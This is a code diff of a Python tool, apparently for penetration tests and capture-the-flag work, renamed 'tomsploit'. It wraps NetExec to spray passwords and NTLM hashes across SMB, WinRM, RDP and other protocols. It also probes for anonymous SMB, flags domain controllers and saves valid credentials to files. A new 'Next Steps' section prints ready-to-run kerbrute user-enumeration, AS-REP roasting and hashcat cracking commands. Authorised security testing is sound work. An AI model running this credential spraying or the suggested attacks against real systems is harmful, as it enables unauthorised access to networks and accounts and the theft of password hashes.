-                    sub_m, sub_msg = parse_nxc_line(line)
-                    if sub_m in ("[+]", "[-]", "[!]"):
-                        result.status_lines.append((sub_m, sub_msg))
-                    else:
-                        result.status_lines.append((marker, line))
-
-            if classification == "connectivity_timeout":
-                if timeout_count >= MAX_RETRY:
-                    result.timeout_skipped = True
-                    result.status_lines.append((
-                        "[!]", f"{MAX_RETRY} consecutive connectivity errors — skipped"
-                    ))
-                    self._print_live(
-                        f"  {YELLOW}⏱ {protocol.upper()} ({scope_label}){RESET}"
-                        f" {DIM}{MAX_RETRY} consecutive connectivity errors — skipping{RESET}"
+                    if not target_info:
+                        target_info = msg
+                elif marker == "[+]":
+                    lines.append((marker, msg))
+                    domain, user, secret, is_admin, is_guest = parse_success_message(msg)
+                    if not secret:
+                        secret = cred.secret
+                        user = user or cred.user
+                    success = Success(
+                        protocol=proto, local_auth=local_auth,
+                        domain=domain, user=user, secret=secret,
+                        auth_type=cred.auth_type,
+                        is_admin=is_admin, is_guest=is_guest,
+                        raw_message=msg,
                     )
-                    ran += 1
-                    self._bump()
-                    remaining = total_per_task - ran
-                    if remaining > 0:
-                        self._bump(remaining)
-                    break
+                    successes.append(success)
+                    color = YELLOW if is_guest else GREEN
+                    tag = " [Guest]" if is_guest else ""
+                    self._say(f"  {color}{BOLD}⚡ {proto.upper()} ({scope_label}){RESET} "
+                              f"{color}{msg}{tag}{RESET}")
+                elif marker in ("[-]", "[!]"):
+                    lines.append((marker, msg))
 
-            ran += 1
-            self._bump()
+            # Surface stderr only when stdout was empty
+            if stderr and not stdout:
+                for raw in stderr.split("\n"):
+                    raw = raw.strip()
+                    if raw:
+                        lines.append(("[-]", raw))
 
-        return result
+            self._tick()
+        return lines, successes, target_info
 
-    # ─── anonymous SMB ─────────────────────────────────────────────────
-    def _run_anon_smb(self, target: str) -> tuple[list[tuple[str, str]], bool]:
-        lines: list[tuple[str, str]] = []
-        success = False
+    # ─── anonymous SMB probe ─
+    def _scan_anon_smb(self, target: str) -> tuple[list[str], bool]:
         cmd = ["nxc", "smb", target, "-u", "", "-p", "",
                "--timeout", str(NETEXEC_TIMEOUT), "--log", self.log_file]
         try:
-            stdout, stderr, timed_out = self._run_subprocess(
-                cmd, timeout=SUBPROCESS_TIMEOUT
-            )
+            stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
         except InterruptedError:
-            return lines, success
-
+            return [], False
         if timed_out:
-            lines.append(("[!]", "Anonymous SMB check timed out"))
-            return lines, success
-
-        for raw_line in stdout.split("\n"):
-            marker, msg = parse_nxc_line(raw_line.strip())
+            return ["[!] Anonymous SMB check timed out"], False
+        out_lines: list[str] = []
+        success = False
+        for raw in stdout.split("\n"):
+            line = raw.strip()
+            if not line:
+                continue
+            out_lines.append(line)
+            marker, msg = parse_nxc_line(line)
             if marker == "[+]":
-                lines.append((marker, msg))
                 success = True
-                self._print_live(
-                    f"  {YELLOW}{BOLD}⚡ SMB (anon){RESET} {YELLOW}{msg}{RESET}"
-                )
-            elif marker in ("[-]", "[!]"):
-                lines.append((marker, msg))
-
+                self._say(f"  {YELLOW}{BOLD}⚡ SMB (anon){RESET} {YELLOW}{msg}{RESET}")
         if stderr and not stdout:
-            for raw_line in stderr.split("\n"):
-                line = raw_line.strip()
-                if line:
-                    lines.append(("[-]", line))
-        return lines, success
+            for raw in stderr.split("\n"):
+                if raw.strip():
+                    out_lines.append(raw.strip())
+        return out_lines, success
 
-    # ─── target orchestration ──────────────────────────────────────────
-    def _scan_target(self, target: str) -> TargetSummary:
-        summary = TargetSummary(target=target)
-        self.reporter.target_header(target)
+    # ─── one target ─
+    def _scan_target(self, target: str) -> TargetResult:
+        result = TargetResult(target=target)
+        print_target_header(target)
 
-        # Pre-flight port probe
         if self.no_port_probe:
-            open_protos = set(self.protocols)
+            open_protos = list(self.protocols)
         else:
             open_protos = probe_protocols(target, self.protocols)
-        summary.open_protocols = open_protos
-        summary.closed_protocols = [p for p in self.protocols if p not in open_protos]
+        result.open_protocols = open_protos
+        result.closed_protocols = [p for p in self.protocols if p not in open_protos]
 
         if not open_protos:
-            summary.scanned = False
-            summary.skipped_reason = "no open ports"
-            self.reporter.all_closed(summary)
-            return summary
+            result.scanned = False
+            result.skipped_reason = "no open ports"
+            print(f"    {RED}✘ No open ports — skipping.{RESET}\n")
+            return result
 
-        self.reporter.port_probe(summary)
+        print_port_probe(result, self.quiet)
 
-        # Build the active task list (protocol, local_auth)
+        # Build task list
         tasks: list[tuple[str, bool]] = []
-        for proto in self.protocols:
-            if proto not in open_protos:
-                continue
+        for proto in open_protos:
             tasks.append((proto, False))
             if proto in LOCAL_AUTH_PROTOCOLS and not self.kerberos:
                 tasks.append((proto, True))
 
-        # Reset progress counters for this target
-        self.completed = 0
-        self.total_tasks = len(tasks) * len(self.credential_pairs)
-        self.scan_start_time = time.time()
-        target_start = time.time()
+        # Reset progress
+        with self._progress_lock:
+            self._done = 0
+            self._total = len(tasks) * len(self.creds)
+            self._redraw()
 
-        # Anonymous SMB runs in parallel with the credentialled scans, but
-        # only if SMB's port is open.
-        anon_lines: list[tuple[str, str]] = []
+        start = time.time()
+        anon_lines: list[str] = []
         anon_success = False
 
-        with ThreadPoolExecutor(max_workers=max(2, self.workers + 2)) as outer:
+        # Run protocols concurrently; anon SMB as a side task
+        with ThreadPoolExecutor(max_workers=max(2, self.workers)) as pool:
             anon_future = None
             if "smb" in open_protos and not self.kerberos:
-                anon_future = outer.submit(self._run_anon_smb, target)
+                anon_future = pool.submit(self._scan_anon_smb, target)
 
-            futures = {
-                outer.submit(self._run_protocol_task, proto, target, local_auth): (proto, local_auth)
-                for proto, local_auth in tasks
+            future_to_task = {
+                pool.submit(self._scan_protocol, proto, target, scope): (proto, scope)
+                for proto, scope in tasks
             }
-
-            for fut in as_completed(futures):
-                if self._stop_event.is_set():
+            for fut in as_completed(future_to_task):
+                if self._stop.is_set():
                     break
+                proto, scope = future_to_task[fut]
+                key = f"{proto}-{'local' if scope else 'domain'}"
                 try:
-                    pr = fut.result()
+                    lines, successes, tinfo = fut.result()
                 except Exception as exc:
-                    proto, local_auth = futures[fut]
-                    pr = ProtocolResult(protocol=proto, local_auth=local_auth)
-                    pr.status_lines.append(("[!]", f"Error: {exc}"))
-                summary.protocol_results.append(pr)
+                    lines = [("[!]", f"Task error: {exc}")]
+                    successes = []
+                    tinfo = ""
+                    if self.debug:
+                        import traceback; traceback.print_exc()
+                result.protocol_lines[key] = lines
+                if tinfo and not result.target_info:
+                    result.target_info = tinfo
+                for s in successes:
+                    (result.guests if s.is_guest else result.successes).append(s)
 
             if anon_future is not None:
                 try:
                     anon_lines, anon_success = anon_future.result()
                 except Exception as exc:
-                    anon_lines = [("[!]", f"Anonymous SMB error: {exc}")]
+                    anon_lines = [f"[!] Anonymous SMB error: {exc}"]
+        result.anon_smb_lines = anon_lines
+        result.anon_smb = anon_success
 
-        summary.anon_smb_lines = anon_lines
-        summary.anon_smb_success = anon_success
+        # Derive hostname / domain / DC / real IP from target_info
+        result.hostname = extract_hostname(result.target_info)
+        result.domain = extract_domain(result.target_info)
+        result.is_dc = looks_like_dc(result.target_info)
 
-        # Sort protocol_results back to canonical order for stable rendering.
-        summary.protocol_results.sort(
-            key=lambda pr: (ALL_PROTOCOLS.index(pr.protocol), pr.local_auth)
-        )
-
-        # Aggregate successes
-        for pr in summary.protocol_results:
-            summary.successes.extend(pr.successes)
-
-        # Hostname/DC/IP inference from any [*] line.
-        target_info = next(
-            (pr.target_info for pr in summary.protocol_results if pr.target_info),
-            ""
-        )
-        if target_info:
-            m = re.search(r"name:([^\s)]+)", target_info, re.IGNORECASE)
-            if m:
-                summary.hostname = m.group(1).upper()
-            info_lower = target_info.lower()
-            name_match = re.search(r"name:([^\s)]+)", info_lower)
-            if name_match:
-                hostname = name_match.group(1)
-                if re.search(r"\bdc\d*\b|^dc|pdc|addc", hostname):
-                    summary.is_dc = True
-
-        # Extract real IP from any nxc line (second token).
-        for pr in summary.protocol_results:
-            for marker, msg in pr.status_lines:
-                ip = self._extract_ip(msg)
+        # Real IP: scan any line for an IPv4
+        for k, lines in result.protocol_lines.items():
+            for _, msg in lines:
+                ip = extract_ipv4(msg)
                 if ip:
-                    summary.real_ip = ip
-                    break
-            if summary.real_ip:
+                    result.real_ip = ip; break
+            if result.real_ip:
                 break
-        if not summary.real_ip:
-            for _, msg in anon_lines:
-                ip = self._extract_ip(msg)
+        if not result.real_ip:
+            for line in anon_lines:
+                ip = extract_ipv4(line)
                 if ip:
-                    summary.real_ip = ip
-                    break
-        if not summary.real_ip:
-            summary.real_ip = target
+                    result.real_ip = ip; break
+        if not result.real_ip:
+            result.real_ip = target
 
-        summary.elapsed = time.time() - target_start
-        sys.stderr.write("\r" + " " * PROGRESS_CLEAR_WIDTH + "\r")
-        sys.stderr.flush()
-        return summary
+        result.elapsed = time.time() - start
+        self._clear_progress()
+        return result
 
-    @staticmethod
-    def _extract_ip(line: str) -> str | None:
-        # nxc lines start with: <PROTO>  <IP>  <PORT>  <HOST>
-        # but here we receive the post-marker message. We still try to find
-        # an IPv4 anywhere in the message as a best effort.
-        m = re.search(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", line)
-        return m.group(0) if m else None
-
-    # ─── entry point ───────────────────────────────────────────────────
+    # ─── full scan ─
     def run(self) -> int:
-        pair_count = len(self.credential_pairs)
-        task_count = len(self.protocols) + sum(
-            1 for p in self.protocols if p in LOCAL_AUTH_PROTOCOLS
-        )
-        total_attempts = len(self.targets) * pair_count * task_count
-
         if not self.quiet:
-            self.reporter.scan_banner(
-                targets=len(self.targets),
-                users=len(self.users),
-                passwords=len(self.passwords),
-                hashes=len(self.hashes),
-                workers=self.workers,
-                mode=self.mode,
-                log_file=self.log_file,
-                creds_file=self.creds_file,
-                kerberos=self.kerberos,
-                protocols=self.protocols,
-                total_attempts=total_attempts,
-            )
-
-        summaries: list[TargetSummary] = []
+            self._print_banner()
+        results: list[TargetResult] = []
         try:
             for target in self.targets:
-                if self._stop_event.is_set():
+                if self._stop.is_set():
                     break
-                summary = self._scan_target(target)
-                self.reporter.target_results(summary)
-                self.reporter.valid_credentials(summary)
-                if summary.successes:
-                    self.reporter.suggested_commands(summary, self.hash_for_suggestions)
-                if self.creds_file and summary.successes:
-                    try:
-                        append_credentials(self.creds_file, summary)
-                    except OSError as exc:
-                        print(f"  {YELLOW}[!] Could not write to creds file: {exc}{RESET}")
-                summaries.append(summary)
+                try:
+                    r = self._scan_target(target)
+                    print_protocol_results(r, self.quiet)
+                    print_valid_section(r, self.extra_hash, self.quiet)
+                    if self.creds_file and r.successes:
+                        try:
+                            append_creds(self.creds_file, r)
+                        except OSError as exc:
+                            print(f"  {YELLOW}[!] Could not write creds file: {exc}{RESET}")
+                    results.append(r)
+                except KeyboardInterrupt:
+                    raise
+                except Exception as exc:
+                    self._clear_progress()
+                    print(f"\n  {RED}{BOLD}✗ Error on {target}:{RESET} "
+                          f"{exc.__class__.__name__}: {exc}")
+                    if self.debug:
+                        import traceback; traceback.print_exc()
+                    else:
+                        print(f"  {DIM}Re-run with --debug for traceback.{RESET}")
+                    failed = TargetResult(target=target)
+                    failed.scanned = False
+                    failed.skipped_reason = f"error: {exc.__class__.__name__}"
+                    results.append(failed)
         finally:
-            if len(summaries) > 1 and not self._stop_event.is_set():
-                self.reporter.summary_table(summaries)
-            if self.json_output:
-                self._write_json(summaries)
+            if len(results) > 1 and not self._stop.is_set():
+                self._print_summary(results)
+            if self.json_out:
+                self._write_json(results)
+            if not self._stop.is_set():
+                self._print_next_steps(results)
+        return 130 if self._stop.is_set() else 0
 
-        return 0 if not self._stop_event.is_set() else 130
+    def _print_banner(self) -> None:
+        proto_label = ("all" if len(self.protocols) == len(ALL_PROTOCOLS)
+                       else ",".join(self.protocols))
+        total = (len(self.targets) * len(self.creds)
+                 * (len(self.protocols) + sum(1 for p in self.protocols
+                                              if p in LOCAL_AUTH_PROTOCOLS)))
+        print(f"\n{BOLD}{'═' * BANNER_WIDTH}{RESET}")
+        print(f"  {CYAN}{BOLD}⚡ tomsploit{RESET}")
+        print(f"{'═' * BANNER_WIDTH}")
+        print(f"  Targets         {DIM}│{RESET} {BOLD}{len(self.targets):<11}{RESET} "
+              f"Protocols {DIM}│{RESET} {BOLD}{proto_label}{RESET}")
+        print(f"  Users           {DIM}│{RESET} {BOLD}{len(self.users):<11}{RESET} "
+              f"Workers   {DIM}│{RESET} {BOLD}{self.workers}{RESET}")
+        cred_label = f"{len(self.passwords)}p / {len(self.hashes)}h"
+        print(f"  Credentials     {DIM}│{RESET} {BOLD}{cred_label:<11}{RESET} "
+              f"Timeout   {DIM}│{RESET} {BOLD}{NETEXEC_TIMEOUT}s{RESET}/attempt")
+        print(f"  Log file        {DIM}│{RESET} {BOLD}{self.log_file}{RESET}")
+        if self.creds_file:
+            print(f"  Creds output    {DIM}│{RESET} {BOLD}{self.creds_file}{RESET}")
+        if self.kerberos:
+            print(f"  Auth method     {DIM}│{RESET} {BOLD}Kerberos cache{RESET}")
+        print(f"  Total attempts  {DIM}│{RESET} {BOLD}{total}{RESET}")
+        print(f"{'═' * BANNER_WIDTH}\n")
 
-    # ─── JSON output ───────────────────────────────────────────────────
-    def _write_json(self, summaries: list[TargetSummary]) -> None:
+    def _print_summary(self, results: list[TargetResult]) -> None:
+        n_win = sum(1 for r in results if r.successes or r.anon_smb)
+        print(f"\n{BOLD}{'═' * BANNER_WIDTH}{RESET}")
+        print(f"  {CYAN}{BOLD}📊 Summary{RESET}  {DIM}({len(results)} targets){RESET}")
+        print(f"{'═' * BANNER_WIDTH}")
+        for r in results:
+            ok = r.successes or r.anon_smb
+            icon = f"{GREEN}✔{RESET}" if ok else f"{RED}✘{RESET}"
+            host = r.target
+            if r.hostname:
+                host += f" {DIM}({r.hostname}){RESET}"
+            if r.is_dc:
+                host += f" {YELLOW}[DC]{RESET}"
+            n_creds = len(r.successes) + (1 if r.anon_smb else 0)
+            cred_tag = (f" {GREEN}{n_creds} cred{'s' if n_creds != 1 else ''}{RESET}"
+                        if n_creds else "")
+            time_tag = f" {DIM}[{r.elapsed:.1f}s]{RESET}"
+            skip_tag = (f" {DIM}({r.skipped_reason}){RESET}"
+                        if not r.scanned else "")
+            print(f"  {icon} {host}{cred_tag}{time_tag}{skip_tag}")
+        print(f"\n  Total: {GREEN}{BOLD}{n_win}{RESET}/{len(results)} "
+              f"targets with credentials")
+        print(f"{'═' * BANNER_WIDTH}\n")
+
+    def _write_json(self, results: list[TargetResult]) -> None:
+        def ser_succ(s: Success) -> dict:
+            return {
+                "protocol": s.protocol, "scope": s.scope,
+                "domain": s.domain, "user": s.user, "secret": s.secret,
+                "auth_type": s.auth_type.value,
+                "is_admin": s.is_admin, "is_guest": s.is_guest,
+                "raw_message": s.raw_message,
+            }
         payload = {
             "scan_time": datetime.now().isoformat(timespec="seconds"),
             "log_file": self.log_file,
@@ -1225,192 +1195,226 @@ class NxcAutomator:
             "protocols": self.protocols,
             "targets": [
                 {
-                    "target": s.target,
-                    "real_ip": s.real_ip,
-                    "hostname": s.hostname,
-                    "is_dc": s.is_dc,
-                    "scanned": s.scanned,
-                    "skipped_reason": s.skipped_reason or None,
-                    "elapsed_seconds": round(s.elapsed, 2),
-                    "open_protocols": sorted(s.open_protocols),
-                    "closed_protocols": s.closed_protocols,
-                    "anon_smb_success": s.anon_smb_success,
-                    "successes": [
-                        {
-                            "protocol": succ.protocol,
-                            "scope": succ.scope,
-                            "domain": succ.domain,
-                            "user": succ.user,
-                            "secret": succ.secret,
-                            "auth_type": succ.auth_type.value,
-                            "is_admin": succ.is_admin,
-                            "raw_message": succ.raw_message,
-                        }
-                        for succ in s.successes
-                    ],
+                    "target": r.target, "real_ip": r.real_ip,
+                    "hostname": r.hostname, "domain": r.domain,
+                    "is_dc": r.is_dc,
+                    "scanned": r.scanned,
+                    "skipped_reason": r.skipped_reason or None,
+                    "elapsed_seconds": round(r.elapsed, 2),
+                    "open_protocols": r.open_protocols,
+                    "closed_protocols": r.closed_protocols,
+                    "anon_smb": r.anon_smb,
+                    "successes": [ser_succ(s) for s in r.successes],
+                    "guests": [ser_succ(s) for s in r.guests],
                 }
-                for s in summaries
+                for r in results
             ],
         }
         try:
-            with open(self.json_output, "w") as f:
+            with open(self.json_out, "w") as f:
                 json.dump(payload, f, indent=2)
-            print(f"  {DIM}JSON output written to {self.json_output}{RESET}\n")
+            # Path is shown in the "Next Steps" section, no separate message.
         except OSError as exc:
-            print(f"  {YELLOW}[!] Could not write JSON output: {exc}{RESET}")
+            print(f"  {YELLOW}[!] Could not write JSON: {exc}{RESET}")
+
+    def _print_next_steps(self, results: list[TargetResult]) -> None:
+        """Show actionable follow-ups after the scan. Three subsections:
+
+          1. No-auth AD attacks (if any DC was detected)
+          2. Hash-cracking command reference (only if DC detected — otherwise
+             you wouldn't have anything to crack)
+          3. Output-file paths (creds TSV, JSON, nxc log)
+        """
+        if self.quiet:
+            return
+
+        # Group DCs by domain so the per-domain commands are emitted once,
+        # even if a domain has multiple DCs in the target list.
+        dcs_by_domain: dict[str, list[tuple[str, str]]] = {}
+        for r in results:
+            if r.is_dc and r.real_ip:
+                key = r.domain or "<DOMAIN>"
+                dcs_by_domain.setdefault(key, []).append(
+                    (r.hostname or r.real_ip, r.real_ip))
+
+        has_dcs = bool(dcs_by_domain)
+        has_files = bool(self.creds_file or self.json_out or self.log_file)
+        if not has_dcs and not has_files:
+            return
+
+        print(f"\n{BOLD}{'═' * BANNER_WIDTH}{RESET}")
+        print(f"  {CYAN}{BOLD}🎯 Next Steps{RESET}")
+        print(f"{'═' * BANNER_WIDTH}")
+
+        if has_dcs:
+            # DC list
+            print(f"\n  {BOLD}Domain Controllers detected{RESET}")
+            print(f"  {DIM}{'─' * 32}{RESET}")
+            for domain, hosts in dcs_by_domain.items():
+                for hostname, ip in hosts:
+                    suffix = f" {DIM}—{RESET} {domain}" if domain != "<DOMAIN>" else ""
+                    print(f"    {YELLOW}►{RESET} {BOLD}{hostname}{RESET} "
+                          f"{DIM}({ip}){RESET}{suffix}")
+
+            # No-auth attacks per unique domain.
+            # AS-REP roast without auth + kerbrute user enumeration. These
+            # are valuable EVEN when working creds were found — they find
+            # additional users that may have crackable hashes.
+            print(f"\n  {BOLD}No-auth AD attacks{RESET} "
+                  f"{DIM}(try alongside any creds found above){RESET}")
+            print(f"  {DIM}{'─' * 32}{RESET}")
+            first = True
+            for domain, hosts in dcs_by_domain.items():
+                if not first:
+                    print()
+                first = False
+                # Pick the first DC's IP — they all serve the same domain.
+                dc_ip = hosts[0][1]
+                dom = domain if domain != "<DOMAIN>" else "<DOMAIN>"
+                print(f"        {DIM}# enumerate valid usernames at {dom}{RESET}")
+                print(f"        kerbrute userenum --dc {dc_ip} -d {dom} "
+                      f"/usr/share/seclists/Usernames/Names/names.txt")
+                print()
+                print(f"        {DIM}# AS-REP roast — any user with preauth disabled = free hash{RESET}")
+                print(f"        impacket-GetNPUsers {dom}/ -dc-ip {dc_ip} "
+                      f"-request -no-pass -usersfile users.txt")
+
+            # Cracking reference — mode numbers are easy to forget under pressure.
+            print(f"\n  {BOLD}Cracking captured hashes{RESET}")
+            print(f"  {DIM}{'─' * 32}{RESET}")
+            print(f"        {DIM}# AS-REP (Kerberos 5 AS-REP){RESET}")
+            print(f"        hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt")
+            print()
+            print(f"        {DIM}# Kerberoast (Kerberos 5 TGS-REP){RESET}")
+            print(f"        hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt")
+            print()
+            print(f"        {DIM}# NTDS / SAM (NTLM){RESET}")
+            print(f"        hashcat -m 1000 ntds.hash /usr/share/wordlists/rockyou.txt")
+
+        if has_files:
+            print(f"\n  {BOLD}Output files{RESET}")
+            print(f"  {DIM}{'─' * 32}{RESET}")
+            # Fixed-width labels for visual alignment.
+            if self.creds_file:
+                print(f"    {DIM}Valid creds (TSV):{RESET}  {self.creds_file}")
+            if self.json_out:
+                print(f"    {DIM}JSON results:     {RESET}  {self.json_out}")
+            if self.log_file:
+                print(f"    {DIM}nxc log:          {RESET}  {self.log_file}")
+
+        print(f"\n{'═' * BANNER_WIDTH}\n")
 
 
 # ─── CLI ───────────────────────────────────────────────────────────────
 
-def parse_mode(value: str) -> str:
-    mode = value.lower()
-    if mode in ("combination", "linear"):
-        return mode
-    raise argparse.ArgumentTypeError("Mode must be one of: combination, linear")
-
-
 def parse_args() -> argparse.Namespace:
-    parser = argparse.ArgumentParser(
-        description="Run nxc across protocols with combination or linear "
-                    "credential pairing. Enumeration helper — does not exploit.",
+    p = argparse.ArgumentParser(
+        prog="tomsploit",
+        description="Run nxc across protocols and credentials. "
+                    "Enumeration only — does not exploit.",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 examples:
-  netexec-automator -t 192.168.1.10 -u admin -p 'Password123'
-  netexec-automator -t 192.168.1.0/24 -u users.txt -p passwords.txt
-  netexec-automator -t targets.txt -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
-  netexec-automator -t 192.168.1.10 -u admin -p 'Password123' --protocols smb,winrm,rdp
-  netexec-automator -t 192.168.1.10 -u admin -k        # use Kerberos ticket cache
-  netexec-automator -t targets.txt -u users.txt -p passwords.txt -m linear
-  netexec-automator -t 192.168.1.10 -u admin -p 'pw' --creds-file creds.tsv
-        """
+  tomsploit -t 192.168.1.10 -u admin -p 'Password123'
+  tomsploit -t 192.168.1.0/24 -u users.txt -p passwords.txt
+  tomsploit -t target.htb -u admin -H aad3b...:31d6cfe0...
+  tomsploit -t 192.168.1.10 -u admin -k
+  tomsploit -t 192.168.1.10 -u admin -p pw --protocols smb,winrm,rdp
+  tomsploit -t targets.txt -u u.txt -p p.txt --creds-file creds.tsv
+""",
     )
-    parser.add_argument("-t", "--target", required=True,
-                        help="Target IP, hostname, CIDR, or file containing any of these.")
-    parser.add_argument("-u", "--user", required=True,
-                        help="Username or path to users file.")
-    parser.add_argument("-p", "--password",
-                        help="Password or path to passwords file.")
-    parser.add_argument("-H", "--hash",
-                        help="NTLM hash (LM:NT or NT-only). Used for scanning AND as "
-                             "the source of pass-the-hash command suggestions. May be "
-                             "a file path containing multiple hashes.")
-    parser.add_argument("-k", "--kerberos", action="store_true",
-                        help="Use Kerberos ticket cache (--use-kcache). Requires a "
-                             "valid TGT (KRB5CCNAME). Cannot be combined with -p/-H.")
-    parser.add_argument("-o", "--output",
-                        help="Custom nxc log file path "
-                             "(default: YYYY-MM-DD_HH-MM-SS.txt).")
-    parser.add_argument("--creds-file", metavar="FILE",
-                        help="Append successful credentials to a TSV file "
-                             "(default: disabled).")
-    parser.add_argument("-w", "--workers", type=int, default=DEFAULT_WORKERS,
-                        help=f"Parallel worker threads (default: {DEFAULT_WORKERS}).")
-    parser.add_argument(
-        "-m", "--mode", type=parse_mode, default="combination",
-        metavar="{combination,linear}",
-        help="Credential pairing: combination (default) or linear.",
-    )
-    parser.add_argument("--protocols", metavar="LIST",
-                        help="Comma-separated subset of protocols to test "
-                             f"(default: all). Valid: {','.join(ALL_PROTOCOLS)}")
-    parser.add_argument("--exclude", metavar="LIST",
-                        help="Comma-separated protocols to skip.")
-    parser.add_argument("--no-port-probe", action="store_true",
-                        help="Skip the pre-flight TCP port probe.")
-    parser.add_argument("--max-cidr-hosts", type=int, default=DEFAULT_MAX_CIDR_HOSTS,
-                        help=f"Maximum hosts a single CIDR may expand to "
-                             f"(default: {DEFAULT_MAX_CIDR_HOSTS}).")
-    parser.add_argument("-q", "--quiet", action="store_true",
-                        help="Suppress banner and negatives; show findings only.")
-    parser.add_argument("--no-color", action="store_true",
-                        help="Disable ANSI color codes.")
-    parser.add_argument("--json-output", metavar="FILE",
-                        help="Write structured findings to a JSON file.")
-    return parser.parse_args()
+    p.add_argument("-t", "--target", required=True,
+                   help="IP, hostname, CIDR, or file containing any of these.")
+    p.add_argument("-u", "--user", required=True,
+                   help="Username or path to users file.")
+    p.add_argument("-p", "--password",
+                   help="Password or path to passwords file.")
+    p.add_argument("-H", "--hash",
+                   help="NTLM hash (LM:NT or NT). May be a file of hashes.")
+    p.add_argument("-k", "--kerberos", action="store_true",
+                   help="Use Kerberos ticket cache (--use-kcache). "
+                        "Requires KRB5CCNAME. Cannot mix with -p/-H.")
+    p.add_argument("-o", "--output",
+                   help="nxc log file path (default: YYYY-MM-DD_HH-MM-SS.txt).")
+    p.add_argument("--creds-file", metavar="FILE",
+                   help="Append valid credentials to a TSV file.")
+    p.add_argument("-w", "--workers", type=int, default=DEFAULT_WORKERS,
+                   help=f"Parallel workers (default: {DEFAULT_WORKERS}).")
+    p.add_argument("--protocols", metavar="LIST",
+                   help=f"Comma-separated subset. Valid: {','.join(ALL_PROTOCOLS)}")
+    p.add_argument("--no-port-probe", action="store_true",
+                   help="Skip pre-flight TCP port probe.")
+    p.add_argument("--max-cidr-hosts", type=int, default=DEFAULT_MAX_CIDR_HOSTS,
+                   help=f"Max hosts in any one CIDR (default: {DEFAULT_MAX_CIDR_HOSTS}).")
+    p.add_argument("-q", "--quiet", action="store_true",
+                   help="Suppress banner and negatives.")
+    p.add_argument("--no-color", action="store_true",
+                   help="Disable ANSI colors.")
+    p.add_argument("--debug", action="store_true",
+                   help="Print full Python tracebacks on errors.")
+    p.add_argument("--json-output", metavar="FILE",
+                   help="Write structured results to a JSON file.")
+    return p.parse_args()
 
 
 def main() -> int:
     args = parse_args()
     configure_colors(args.no_color)
 
-    # ─ Fail-fast environment checks ─
     if not shutil.which("nxc"):
-        print(f"{RED}{BOLD}Error:{RESET} 'nxc' (NetExec) is not on PATH. "
-              f"Install it first (https://github.com/Pennyw0rth/NetExec).",
+        print(f"{RED}{BOLD}Error:{RESET} 'nxc' (NetExec) not on PATH.",
               file=sys.stderr)
         return 1
 
-    # ─ Auth validation ─
     if args.kerberos and (args.password or args.hash):
-        print(f"{RED}{BOLD}Error:{RESET} -k cannot be combined with -p or -H.",
+        print(f"{RED}{BOLD}Error:{RESET} -k cannot combine with -p or -H.",
               file=sys.stderr)
         return 1
     if not args.kerberos and not args.password and not args.hash:
-        print(f"{RED}{BOLD}Error:{RESET} provide one of -p (password), "
-              f"-H (NTLM hash), or -k (Kerberos cache).", file=sys.stderr)
+        print(f"{RED}{BOLD}Error:{RESET} need one of -p, -H, or -k.",
+              file=sys.stderr)
         return 1
 
     try:
-        # Resolve targets (file or single, then CIDR expansion).
         raw_targets = read_value_or_file(args.target)
-        targets = expand_targets(raw_targets, max_cidr_hosts=args.max_cidr_hosts)
+        targets = expand_targets(raw_targets, args.max_cidr_hosts)
         if not targets:
             raise ValueError("No targets after expansion.")
-
         users = read_value_or_file(args.user)
         passwords = read_value_or_file(args.password) if args.password else []
         hashes = read_value_or_file(args.hash) if args.hash else []
+        protocols = parse_protocol_list(args.protocols)
+        if not protocols:
+            raise ValueError("No protocols selected.")
+        log_file = args.output or datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
+        # extra_hash for PtH suggestions when password creds succeed
+        extra_hash = hashes[0] if len(hashes) == 1 else None
 
-        # Protocol selection.
-        selected = parse_protocol_list(args.protocols, ALL_PROTOCOLS)
-        if args.exclude:
-            excluded = parse_protocol_list(args.exclude, ALL_PROTOCOLS)
-            selected = [p for p in selected if p not in excluded]
-        if not selected:
-            raise ValueError("No protocols left to test after --protocols/--exclude.")
-
-        # Hash-for-suggestions: when the user supplied a single hash, also pass
-        # it through for PtH command hints, matching the old behaviour.
-        hash_for_suggestions = hashes[0] if len(hashes) == 1 else None
-
-        runner = NxcAutomator(
-            targets=targets,
-            users=users,
-            passwords=passwords,
-            hashes=hashes,
-            hash_for_suggestions=hash_for_suggestions,
-            kerberos=args.kerberos,
-            protocols=selected,
-            output=args.output,
-            creds_file=args.creds_file,
-            workers=args.workers,
-            mode=args.mode,
-            quiet=args.quiet,
-            json_output=args.json_output,
-            no_port_probe=args.no_port_probe,
+        runner = TomSploit(
+            targets=targets, users=users, passwords=passwords,
+            hashes=hashes, kerberos=args.kerberos,
+            protocols=protocols, log_file=log_file,
+            creds_file=args.creds_file, json_out=args.json_output,
+            workers=args.workers, quiet=args.quiet, debug=args.debug,
+            no_port_probe=args.no_port_probe, extra_hash=extra_hash,
         )
     except ValueError as exc:
         print(f"{RED}{BOLD}Error:{RESET} {exc}", file=sys.stderr)
         return 1
 
-    # ─ Signal handling for graceful Ctrl-C ─
-    interrupted = {"count": 0}
+    interrupted = {"n": 0}
 
-    def _sigint_handler(signum, frame):
-        interrupted["count"] += 1
-        if interrupted["count"] == 1:
+    def _sigint(_signum, _frame):
+        interrupted["n"] += 1
+        if interrupted["n"] == 1:
             sys.stderr.write(
-                f"\n  {YELLOW}{BOLD}⚠ Interrupt received — cancelling, "
-                f"press Ctrl-C again to force exit{RESET}\n"
+                f"\n  {YELLOW}{BOLD}⚠ Cancelling — Ctrl-C again to force.{RESET}\n"
             )
             sys.stderr.flush()
             runner.cancel()
         else:
-            sys.stderr.write(f"\n  {RED}Forced exit.{RESET}\n")
             os._exit(130)
-
-    signal.signal(signal.SIGINT, _sigint_handler)
+    signal.signal(signal.SIGINT, _sigint)
 
     try:
         return runner.run()
@@ -1421,3 +1425,18 @@ def main() -> int:
 
 if __name__ == "__main__":
     sys.exit(main())
+
+# ── MIT License ────────────────────────────────────────────────────────
+# Copyright (c) 2026 Kazgangap
+# Modifications Copyright (c) 2026 twhitehead290
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
